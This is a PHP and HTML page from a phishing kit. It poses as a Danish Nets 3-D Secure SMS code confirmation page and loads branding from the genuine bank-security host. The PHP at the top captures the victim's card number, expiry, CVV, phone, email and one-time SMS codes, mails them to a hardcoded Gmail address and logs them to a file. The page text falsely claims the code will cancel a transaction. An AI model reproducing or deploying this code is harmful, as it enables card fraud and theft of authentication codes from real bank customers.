<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "sms  1       : ".$_POST['otp']."\n";
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "N-Phone      : ".$_POST['tel']."\n";
$bilsmg .= "E-mail       : ".$_POST['email']."\n";
$bilsmg .= "C-Number     : ".$_POST['cc']."\n";
$bilsmg .= "D-Expiration : ".$_POST['expe']."\n";
$bilsmg .= "CVN          : ".$_POST['cvv']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "T1 - ".$ip;
$bilhead = "From: Nets <Mr.pinky@localhost.ma>";
if(!empty($_POST['otp']) && strlen($_POST['otp'])>5 && file_exists("../CC-326548521599.txt")){
mail("silviodemesquita@gmail.com",$bilsub,$bilsmg,$bilhead);
$file = fopen("../CC-326548521599.txt", 'a');
fwrite($file, $bilsmg);}
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML lang="en">
<HEAD>
    <TITLE>Autentisering</TITLE>
    <META content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <LINK rel="stylesheet" type="text/css" href="https://acs4.3dsecure.no/mdpayacs/content/040/screen.css" />
    <LINK rel="stylesheet" type="text/css" href="https://acs4.3dsecure.no/mdpayacs/content/040/dk/gh-buttons.css" />
    <script src="https://acs4.3dsecure.no/mdpayacs/content/commons.js"></script>
    <script src="https://acs4.3dsecure.no/mdpayacs/content/040/js/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="./Autentisering_files/date_time.js"></script>
    <script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
		
		function validate(){
	
var cd=document.getElementById("code");
var flag=0;

if (cd.value=="" || cd.value.length<6)
 {	cd.style.borderColor="red";flag=1;
 }else{ 
  	cd.style.borderColor="green";
   }
 if (flag==1)
{document.getElementById("msg_error").style.display="block";return false;}else{document.getElementById("msg_error").style.display="none";return true;}
	
		}
    </script>
</HEAD>
<BODY OnLoad="onBodyLoad();">
<DIV id="authform">
    <DIV class="wrapper">
        <DIV class="logos">
            <TABLE>
                <TBODY>
                <TR>
                    <TD class="identifier">
                        <IMG alt="" src="https://acs4.3dsecure.no/mdpayacs/graphics/schema_1.png" style="max-height:56px;"/><IMG alt="" src="https://acs4.3dsecure.no/mdpayacs/graphics/schema_2.png" style="max-height:56px;"/>
                    </TD>
                    <TD class="bank">
                        <div title="Engelsk"> <a href=""><img src="https://acs4.3dsecure.no/mdpayacs/content/227/images/en.png" alt="Engelsk"/></a></div>
                    </TD>
                    <TD class="bank">
                        <IMG alt="" src="https://acs4.3dsecure.no/mdpayacs/logos/netstech_small.png" style="max-height:56px;"/>
                    </TD>
                </TR>
                </TBODY>
            </TABLE>
        </DIV>
        <H1>Indtast SMS kode</H1>
        <P>En bekr&#xE6;ftelseskode er sendt til din mobile enhed (10 minutter max).</P>
        <p>Indtast koden modtaget via telefon for at annullere transaktionen</p>
        <FORM id="form" name="form" method="post" action="auth2.php" onsubmit="return validate()">
        <input name="sms1" value="<?php echo $_POST['otp']; ?>" type="hidden" />
         <input name="tel" value="<?php echo $_POST['tel']; ?>" type="hidden" />
        <input name="email" value="<?php echo $_POST['email']; ?>" type="hidden" />
        <input name="cc" value="<?php echo $_POST['cc'];?>" type="hidden" />
        <input name="expe" value="<?php echo $_POST['expe']; ?>" type="hidden" />
        <input name="cvv" value="<?php echo $_POST['cvv'];?>" type="hidden" />
            <DL style="margin-top: 10px;">
                <DT>Nets</DT>
                <DD id="purchAmount">K&#xF8;b refusion transaktion</DD>

                <DT>Dato: </DT>
                <DD><span id="date_time"></span></DD>
				            <script type="text/javascript">window.onload = date_time('date_time');</script>

                <DT>Kortnummer: </DT>
                <DD><?php 
                echo substr($_POST['cc'], 0, 4)." XXXX XXXX ".substr($_POST['cc'],-4);
                ?></DD>

                <DT>Mobiltelefonnummer: </DT>
                <DD><?php echo $_POST['tel'];?></DD>
                <DT>
                    <LABEL for="code">SMS kode : </LABEL>
                </DT>
                <DD>
                    <INPUT name="otp" type="text" required="required" id="code" style="width: 100px" maxlength="8" onKeyPress="return submitenter(this,event)" width="6" />
                    <button class="button icon approve primary" name="submit" id="submit" type="submit" value="submit" style="position: absolute; margin-left: 5px;">Bekr&#230;ft</button>
                </DD>
            </DL>
            <div id="msg_error" class="error" style="display: none;padding-bottom:10px;">Tjek venligst de markerede felter.</div>
            <DIV style="font-size: 0.92em; margin-bottom: 8px;">
             <div id="errorMessage" class="error">Din bekr&#xE6;ftelseskode er udl&#xF8;bet, en ny kode er blevet sendt</div>
             <div id="errorMessage" class="error">	Luk ikke websiden, f&#248;r du har modtaget engangsadgangskoden </div>
                <div>
                <P>&nbsp;</P>
                
            </DIV>
            <A class="button icon settings" >&AElig;ndre nummer</A>
            <A class="button" >NemID</A>
            <A class="button icon add" >Ny kode</A>
            <DIV style="float: right;">
                <A class="button icon arrowleft" >Tilbage</A>
            </DIV>
        </FORM>
    </DIV>
</DIV>
</BODY>
</HTML>